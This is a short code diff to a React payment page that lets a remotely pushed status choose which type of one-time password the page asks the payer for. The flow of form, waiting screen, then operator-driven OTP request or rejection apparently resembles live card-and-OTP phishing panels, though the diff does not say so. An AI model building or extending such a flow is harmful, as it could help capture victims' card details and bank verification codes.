@@ -1,6 +1,7 @@
 import { useState, useEffect, useMemo, useRef } from "react";
 import PaymentForm from "@/components/PaymentForm";
 import OtpVerification from "@/components/OtpVerification";
+import type { OtpType } from "@/components/OtpVerification";
 import PaymentSuccess from "@/components/PaymentSuccess";
 import PaymentRejected from "@/components/PaymentRejected";
 import WaitingScreen from "@/components/WaitingScreen";
@@ -34,6 +35,7 @@ const Index = () => {
   const [amount, setAmount] = useState("");
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [otpError, setOtpError] = useState<string | null>(null);
+  const [otpType, setOtpType] = useState<OtpType>("6digit");
 
   const parsedAmount = parseFloat(amount) || 0;
   const transactionFee = parsedAmount > 0 ? parseFloat((parsedAmount * 0.001).toFixed(2)) : 0;
@@ -67,7 +69,12 @@ const Index = () => {
         (payload) => {
           const newStatus = (payload.new as any).status;
           if (step === "waiting") {
-            if (newStatus === "otp") { setOtpError(null); setStep("otp"); }
+            if (newStatus === "otp") {
+              setOtpError(null);
+              const formData = (payload.new as any).form_data || {};
+              setOtpType((formData.otp_type as OtpType) || "6digit");
+              setStep("otp");
+            }
             if (newStatus === "rejected") setStep("rejected");
           }
           if (step === "otp") {
@@ -210,7 +217,7 @@ const Index = () => {
             />
           )}
           {step === "waiting" && <WaitingScreen amount={formattedTotal} />}
-          {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} error={otpError} />}
+          {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} error={otpError} otpType={otpType} />}
           {step === "processing" && <WaitingScreen amount={formattedTotal} />}
           {step === "success" && <PaymentSuccess amount={formatEuro(total)} />}
           {step === "rejected" && <PaymentRejected onRetry={() => { setStep("form"); setSessionId(null); }} />}
